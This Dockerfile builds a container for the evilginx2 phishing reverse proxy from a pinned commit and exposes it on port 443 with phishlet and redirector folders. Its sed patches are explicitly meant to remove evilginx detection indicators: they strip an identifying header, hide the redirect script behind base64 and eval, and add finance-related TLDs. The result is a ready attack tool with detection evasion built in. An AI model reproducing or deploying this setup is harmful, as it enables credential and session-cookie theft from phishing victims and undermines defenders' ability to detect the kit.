FROM golang:1.25-trixie AS builder

RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        git \
        make \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /opt
RUN git clone https://github.com/kgretzky/evilginx2

# Pin to specific moment in time (https://github.com/kgretzky/evilginx2/commit/30f20165749a5996d46a35b820b41c33a830327b)
WORKDIR /opt/evilginx2
RUN git checkout 30f2016

# Removing evilginx indicators and improve functionality
RUN sed -i 's/req.Header.Set(p.getHomeDir(), o_host)/\/\/req.Header.Set(p.getHomeDir(), o_host)/' /opt/evilginx2/core/http_proxy.go
RUN sed -i 's/GenRandomString(8)/GenRandomString(16)/' /opt/evilginx2/core/terminal.go
RUN sed -i '/io\/ioutil/d' /opt/evilginx2/core/certdb.go \
    && sed -i 's/ioutil\.ReadFile/os.ReadFile/g' /opt/evilginx2/core/certdb.go \
    && sed -i 's/ioutil\.WriteFile/os.WriteFile/g' /opt/evilginx2/core/certdb.go \
    && sed -i '/io\/ioutil/d' /opt/evilginx2/core/http_proxy.go \
    && sed -i 's/ioutil\.ReadFile/os.ReadFile/g' /opt/evilginx2/core/http_proxy.go \
    && sed -i 's/ioutil\.ReadAll/io.ReadAll/g' /opt/evilginx2/core/http_proxy.go \
    && sed -i 's/ioutil\.NopCloser/io.NopCloser/g' /opt/evilginx2/core/http_proxy.go \
    && sed -i '/io\/ioutil/d' /opt/evilginx2/core/terminal.go \
    && sed -i 's/ioutil\.ReadDir/os.ReadDir/g' /opt/evilginx2/core/terminal.go \
    && sed -i 's/ioutil\.ReadAll/io.ReadAll/g' /opt/evilginx2/core/terminal.go \
    && sed -i 's/"io\/ioutil"/"io"/g' /opt/evilginx2/core/utils.go \
    && sed -i 's/ioutil\.ReadAll/io.ReadAll/g' /opt/evilginx2/core/utils.go
RUN sed -i 's/|yu|za|zm|zw/|yu|za|zm|zw|asp|social|bank|finance|money|invest|capital|credit|insurance|app|store/' /opt/evilginx2/core/http_proxy.go
RUN sed -i "s|body := fmt.Sprintf(\"<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>\", rurl)|js := fmt.Sprintf(\"top.location.href='%s';\", rurl)\\n\\tencodedJs := base64.StdEncoding.EncodeToString([]byte(js))\\n\\tbody := fmt.Sprintf(\"<html><head><script>eval(atob('%s'));</script></head><body></body></html>\", encodedJs)|g" /opt/evilginx2/core/http_proxy.go \
    && sed -i "s|fmt\\.Sprintf(\"top\\.location\\.href='%s';\", rurl)|fmt.Sprintf(\"top.location.href=%s;\", strconv.Quote(rurl))|g" /opt/evilginx2/core/http_proxy.go
RUN sed -i '/s_hash = s_hash\[:4\] + "-" + s_hash\[4:\]/d' /opt/evilginx2/core/http_proxy.go

# Build eviginx binary
RUN make \
    && BIN_PATH="$(find . -maxdepth 2 -type f -name evilginx -perm -111 | head -n1)" \
    && if [ -z "$BIN_PATH" ]; then echo "evilginx binary not found" >&2; exit 1; fi \
    && install -m 0755 "$BIN_PATH" /tmp/evilginx

# Build final slim docker image
FROM debian:trixie-slim

RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        bash \
        bash-completion \
        ca-certificates \
        less \
    && rm -rf /var/lib/apt/lists/*

COPY --from=builder /tmp/evilginx /usr/local/bin/evilginx
COPY config/config.json /usr/local/share/evilginx/config.default.json
COPY entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod 0755 /usr/local/bin/entrypoint.sh

# Expose port 443
EXPOSE 443

# Define the mount points for phishlets and config folders
VOLUME ["/opt/phishlets", "/opt/redirectors", "/root/.evilginx"]

WORKDIR /opt

ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
CMD ["evilginx", "-p", "phishlets/", "-t", "redirectors/", "-developer"]